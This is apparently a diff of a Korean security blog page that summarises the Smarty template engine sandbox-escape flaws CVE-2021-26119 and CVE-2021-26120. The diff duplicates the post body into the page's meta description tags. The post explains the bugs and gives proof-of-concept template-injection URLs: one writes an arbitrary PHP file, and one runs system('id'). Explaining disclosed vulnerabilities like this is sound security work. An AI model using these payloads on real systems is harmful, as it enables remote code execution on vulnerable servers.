@@ -13,15 +13,91 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html&#34;&gt;Smarty Template Engine Sandbox escape PHP Code Injection&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;&lt;strong&gt;Target&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Smarty Endgine &amp;lt;= 3.1.38&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Smarty&amp;#xB294; PHP&amp;#xC6A9; template engine&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Smarty&amp;#xB294; presentation(html/css)&amp;#xACFC; app logic&amp;#xC744; &amp;#xBD84;&amp;#xB9AC;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; PHP insulation(sandbox)&amp;#xC744; &amp;#xD1B5;&amp;#xD574; injection &amp;#xACF5;&amp;#xACA9;&amp;#xC758; &amp;#xD53C;&amp;#xD574;&amp;#xBC94;&amp;#xC704;&amp;#xB97C; &amp;#xC81C;&amp;#xD55C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; Template injection&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD560; &amp;#xB54C; sandbox escape&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-26119&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;super global &amp;#xBCC0;&amp;#xC218; &lt;code&gt;$smarty.template_object&lt;/code&gt;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C;  Template injection&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD560; &amp;#xB54C; Smarty&amp;#xC758; &amp;#xC778;&amp;#xC2A4;&amp;#xD134;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;compile&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &lt;code&gt;{$poc=$smarty.template_object}&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xAC12;&amp;#xC744; &amp;#xBC1B;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;$poc&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;Smarty_Internal_Template&lt;/code&gt; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Internal_Template)&lt;span class=&#34;hljs-meta&#34;&gt;#7 (24) {  &lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;_objType&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)  
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;smarty&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty)&lt;span class=&#34;hljs-meta&#34;&gt;#1 (76) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;source&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Template_Source)&lt;span class=&#34;hljs-meta&#34;&gt;#8 (16) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;parent&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty)&lt;span class=&#34;hljs-meta&#34;&gt;#1 (76) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;ext&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Internal_Extension_Handler)&lt;span class=&#34;hljs-meta&#34;&gt;#10 (4) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;compiled&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Template_Compiled)&lt;span class=&#34;hljs-meta&#34;&gt;#11 (12) { ... }&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xB294; &lt;code&gt;Smarty_Internal_Template&lt;/code&gt;&amp;#xAC1D;&amp;#xCCB4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xCEE4;&amp;#xB294; &lt;code&gt;[&amp;quot;smarty&amp;quot;]&lt;/code&gt;&amp;#xB610;&amp;#xB294; &lt;code&gt;[&amp;quot;parent&amp;quot;]&lt;/code&gt; &amp;#xAC12;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; Smarty&amp;#xC758; &amp;#xC778;&amp;#xC2A4;&amp;#xD134;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; arbitrary file write&amp;#xB85C; &amp;#xACF5;&amp;#xACA9; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; &amp;#xD655;&amp;#xC7A5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs URL&#34;&gt;http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object-&amp;gt;smarty}{$fp=$smarty.template_object-&amp;gt;compiled-&amp;gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,&amp;quot;&amp;lt;?php+phpinfo();&amp;quot;,$s)}&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-26120&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;template syntax&amp;#xB97C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;Smarty_Internal_Runtime_TPlFunction&lt;/code&gt;&amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xB294; attacker controlled data&amp;#xC778; &lt;code&gt;name&lt;/code&gt;&amp;#xC744; &amp;#xD544;&amp;#xD130;&amp;#xB9C1;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xD568;&amp;#xC218; &amp;#xC778;&amp;#xC81D;&amp;#xC158;&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs javascript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/* input = {function name=&amp;apos;test&amp;apos;}{/function} */&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!function_exists(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;smarty_template_function_test_8782550315ffc7c00946f78_05745875&amp;apos;&lt;/span&gt;)) {
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;smarty_template_function_test_8782550315ffc7c00946f78_05745875&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;Smarty_Internal_Template $_smarty_tpl,$params&lt;/span&gt;) &lt;/span&gt;{
+	    foreach ($params &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; $key =&amp;gt; $value) {
+            $_smarty_tpl-&amp;gt;tpl_vars[$key] = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Smarty_Variable($value, $_smarty_tpl-&amp;gt;isRenderingCache);
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC785;&amp;#xB825; &lt;code&gt;{function name=&amp;apos;test&amp;apos;}{/function}&lt;/code&gt;&amp;#xC744; &amp;#xBC1B;&amp;#xC740; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB7EC;&amp;#xB294; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs URL&#34;&gt;http://localhost:8000/page.php?poc=string:{function+name=&amp;apos;rce(){};system(&amp;quot;id&amp;quot;);function+&amp;apos;}{/function}&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] Smarty Template Engine Sandbox escape - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html&#34;&gt;Smarty Template Engine Sandbox escape PHP Code Injection&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;&lt;strong&gt;Target&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Smarty Endgine &amp;lt;= 3.1.38&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Smarty&amp;#xB294; PHP&amp;#xC6A9; template engine&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Smarty&amp;#xB294; presentation(html/css)&amp;#xACFC; app logic&amp;#xC744; &amp;#xBD84;&amp;#xB9AC;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; PHP insulation(sandbox)&amp;#xC744; &amp;#xD1B5;&amp;#xD574; injection &amp;#xACF5;&amp;#xACA9;&amp;#xC758; &amp;#xD53C;&amp;#xD574;&amp;#xBC94;&amp;#xC704;&amp;#xB97C; &amp;#xC81C;&amp;#xD55C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; Template injection&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD560; &amp;#xB54C; sandbox escape&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-26119&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;super global &amp;#xBCC0;&amp;#xC218; &lt;code&gt;$smarty.template_object&lt;/code&gt;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C;  Template injection&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD560; &amp;#xB54C; Smarty&amp;#xC758; &amp;#xC778;&amp;#xC2A4;&amp;#xD134;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;compile&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &lt;code&gt;{$poc=$smarty.template_object}&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xAC12;&amp;#xC744; &amp;#xBC1B;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;$poc&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;Smarty_Internal_Template&lt;/code&gt; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs csharp&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Internal_Template)&lt;span class=&#34;hljs-meta&#34;&gt;#7 (24) {  &lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;_objType&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)  
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;smarty&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty)&lt;span class=&#34;hljs-meta&#34;&gt;#1 (76) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;source&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Template_Source)&lt;span class=&#34;hljs-meta&#34;&gt;#8 (16) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;parent&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty)&lt;span class=&#34;hljs-meta&#34;&gt;#1 (76) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;ext&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Internal_Extension_Handler)&lt;span class=&#34;hljs-meta&#34;&gt;#10 (4) { ... }&lt;/span&gt;
+  [&lt;span class=&#34;hljs-meta&#34;&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;compiled&amp;quot;&lt;/span&gt;&lt;/span&gt;]=&amp;gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(Smarty_Template_Compiled)&lt;span class=&#34;hljs-meta&#34;&gt;#11 (12) { ... }&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xB294; &lt;code&gt;Smarty_Internal_Template&lt;/code&gt;&amp;#xAC1D;&amp;#xCCB4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xCEE4;&amp;#xB294; &lt;code&gt;[&amp;quot;smarty&amp;quot;]&lt;/code&gt;&amp;#xB610;&amp;#xB294; &lt;code&gt;[&amp;quot;parent&amp;quot;]&lt;/code&gt; &amp;#xAC12;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; Smarty&amp;#xC758; &amp;#xC778;&amp;#xC2A4;&amp;#xD134;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; arbitrary file write&amp;#xB85C; &amp;#xACF5;&amp;#xACA9; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; &amp;#xD655;&amp;#xC7A5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs URL&#34;&gt;http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object-&amp;gt;smarty}{$fp=$smarty.template_object-&amp;gt;compiled-&amp;gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,&amp;quot;&amp;lt;?php+phpinfo();&amp;quot;,$s)}&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-26120&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;template syntax&amp;#xB97C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;Smarty_Internal_Runtime_TPlFunction&lt;/code&gt;&amp;#xD074;&amp;#xB798;&amp;#xC2A4;&amp;#xB294; attacker controlled data&amp;#xC778; &lt;code&gt;name&lt;/code&gt;&amp;#xC744; &amp;#xD544;&amp;#xD130;&amp;#xB9C1;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xD568;&amp;#xC218; &amp;#xC778;&amp;#xC81D;&amp;#xC158;&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs javascript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/* input = {function name=&amp;apos;test&amp;apos;}{/function} */&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!function_exists(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;smarty_template_function_test_8782550315ffc7c00946f78_05745875&amp;apos;&lt;/span&gt;)) {
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;smarty_template_function_test_8782550315ffc7c00946f78_05745875&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;Smarty_Internal_Template $_smarty_tpl,$params&lt;/span&gt;) &lt;/span&gt;{
+	    foreach ($params &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; $key =&amp;gt; $value) {
+            $_smarty_tpl-&amp;gt;tpl_vars[$key] = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Smarty_Variable($value, $_smarty_tpl-&amp;gt;isRenderingCache);
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC785;&amp;#xB825; &lt;code&gt;{function name=&amp;apos;test&amp;apos;}{/function}&lt;/code&gt;&amp;#xC744; &amp;#xBC1B;&amp;#xC740; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB7EC;&amp;#xB294; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs URL&#34;&gt;http://localhost:8000/page.php?poc=string:{function+name=&amp;apos;rce(){};system(&amp;quot;id&amp;quot;);function+&amp;apos;}{/function}&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/02/20/fabu1ous/2021-02-20/">
@@ -260,12 +336,8 @@
   <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) { ... }</span>
   [<span class="hljs-meta"><span class="hljs-meta-string">&quot;compiled&quot;</span></span>]=&gt;
   <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) { ... }</span></code></pre>
-
 <p>&#xC704;&#xB294; <code>Smarty_Internal_Template</code>&#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; <code>[&quot;smarty&quot;]</code>&#xB610;&#xB294; <code>[&quot;parent&quot;]</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; Smarty&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; arbitrary file write&#xB85C; &#xACF5;&#xACA9; &#xBC94;&#xC704;&#xB97C; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{$s=$smarty.template_object-&gt;smarty}{$fp=$smarty.template_object-&gt;compiled-&gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)}</code></pre>
-
-
-
 <ul>
 <li>CVE-2021-26120</li>
 </ul>
@@ -280,10 +352,8 @@
     }
 }
 </code></pre>
-
 <p>&#xC785;&#xB825; <code>{function name=&apos;test&apos;}{/function}</code>&#xC744; &#xBC1B;&#xC740; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs URL">http://localhost:8000/page.php?poc=string:{function+name=&apos;rce(){};system(&quot;id&quot;);function+&apos;}{/function}</code></pre>
-
 
             </div>
             <hr>
@@ -301,9 +371,9 @@
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
-                  
                   <a class="hover-with-bg" href="/tags/cve/">cve</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                   
                   <a class="hover-with-bg" href="/tags/sandbox/">sandbox</a>
                   
